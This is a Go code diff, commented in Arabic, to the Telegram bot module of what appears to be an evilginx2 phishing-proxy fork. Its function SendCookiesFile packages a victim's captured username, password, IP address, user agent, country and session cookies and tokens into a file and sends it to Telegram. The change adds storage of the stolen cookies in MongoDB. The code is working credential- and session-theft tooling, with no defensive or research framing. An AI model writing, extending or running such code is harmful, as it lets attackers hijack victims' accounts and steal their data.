@@ -11,7 +11,7 @@ import (
 	"mime/multipart"
 
 	"github.com/kgretzky/evilginx2/log"
-	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/database" // تأكد من إضافة هذا الاستيراد
 
     "encoding/json"
 )
@@ -616,7 +616,6 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 	return nil
 }
 
-// SendCookiesFile يرسل الكوكيز إلى تيليجرام ويحدث الجلسة
 func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]*database.CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
 	if !t.Enabled {
 		return fmt.Errorf("بوت التليجرام غير مفعل")
@@ -666,27 +665,22 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 	cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", country, countryCode)
 	cookiesText += "=== الكوكيز ===\n" + string(cookiesJSON) + "\n\n"
 	
+	// حفظ cookiesList في قاعدة البيانات MongoDB
+	// استدعاء الدالة المسؤولة عن حفظ cookiesList في قاعدة البيانات
+	// يجب استخدام الواجهة العامة IDatabase
+	// نحن نفترض أن هناك متغير عام يمثل قاعدة البيانات متاح لنا في core
+	if db, ok := Databases["mongodb"].(*database.MongoDatabase); ok {
+		if err := db.SetSessionCookies(sessionID, cookiesList); err != nil {
+			log.Error("فشل في حفظ الكوكيز في قاعدة البيانات: %v", err)
+			// نستمر على الرغم من الخطأ لإرسال الملف على الأقل
+		} else {
+			log.Success("تم حفظ الكوكيز في قاعدة البيانات بنجاح")
+		}
+	} else {
+		log.Warning("قاعدة البيانات MongoDB غير متاحة، لم يتم حفظ الكوكيز")
+	}
+	
 	// إرسال الملف
 	fileName := fmt.Sprintf("cookies_%s_%s.txt", name, sessionID)
-	err = t.SendFileFromText(fileName, cookiesText)
-	if err != nil {
-		log.Error("فشل في إرسال ملف الكوكيز: %v", err)
-		return err
-	}
-	
-	// تحديث الجلسة في قاعدة البيانات لتخزين الكوكيز
-	session, err := database.GetSessionByID(sessionID) // تأكد من وجود دالة لاسترجاع الجلسة
-	if err != nil {
-		log.Error("خطأ في استرجاع الجلسة من قاعدة البيانات: %v", err)
-		return err
-	}
-	
-	err = database.UpdateSession(session) // تأكد من وجود دالة لتحديث الجلسة
-	if err != nil {
-		log.Error("خطأ في تحديث الجلسة في قاعدة البيانات: %v", err)
-		return err
-	}
-	
-	log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", sessionID)
-	return nil
+	return t.SendFileFromText(fileName, cookiesText)
 }
